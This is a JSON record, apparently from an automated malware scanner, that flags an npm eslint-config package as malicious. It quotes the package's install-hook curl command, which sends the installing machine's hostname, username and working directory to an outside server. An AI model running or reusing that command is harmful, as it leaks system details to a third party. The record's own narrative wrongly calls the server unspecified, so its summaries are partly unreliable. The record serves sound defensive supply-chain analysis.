@@ -1,0 +1,55 @@
+{
+  "package_name": "@yandex-travel/eslint-config",
+  "version": "0.0.7",
+  "label": "malicious",
+  "semantic_summary": {
+    "num_behaviors": 1,
+    "risk_vector": [
+      "install_hook"
+    ],
+    "behaviors": [
+      {
+        "category": "install_hook",
+        "summary": "The package contains an install hook that executes at install time with commands listed in the package metadata.",
+        "details": "The install hook command is a curl command that sends a POST request to a remote server with sensitive information in the request body. The request body contains the package name, version, hostname, whoami, and pwd in base64 encoded format. The request body also contains the string 'meow!securitytest'. This behavior may indicate a malicious intent to install the package.",
+        "confidence": 0.92,
+        "evidence_commands": [
+          "curl -H \"Package:@yandex-travel/eslint-config\" -H \"Version:0.0.7\" -H \"Hostname:$(hostname|base64)\" -H \"Whoami:$(whoami|base64)\" -H \"Pwd:$(pwd|base64)\" -d \"meow!securitytest\" http://npm_org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru"
+        ],
+        "evidence_files": [],
+        "evidence_apis": [],
+        "evidence_domains": [],
+        "evidence_env_vars": []
+      }
+    ],
+    "analyst_note": ""
+  },
+  "verification_result": {
+    "chain_analysis": {
+      "chain_narrative": "The package '@yandex-travel/eslint-config' contains an install hook that sends a POST request to a remote server with sensitive information in the request body. The request body contains the package name, version, hostname, and other sensitive information. The remote server is not specified in the evidence provided.",
+      "attack_vector": [
+        "postinstallhook",
+        "bash-c",
+        "unknown_ip",
+        "unknown_domain",
+        "unknown_command"
+      ],
+      "chain_score": 0.7,
+      "verdict": "MALICIOUS",
+      "confidence": 0.7
+    },
+    "legitimacy_check": {
+      "is_justified": false,
+      "reasoning": "The package does not contain a description or README file."
+    }
+  },
+  "analysis_metadata": {
+    "model": "deepseek-coder-6.7b-instruct",
+    "stage": "verification_v2.0",
+    "structural_routing": "review",
+    "structural_risk_score": 0.336,
+    "confirmed_signals_count": 1,
+    "has_structural_backup": true
+  },
+  "created_at": "2026-03-27T13:05:45.891863"
+}
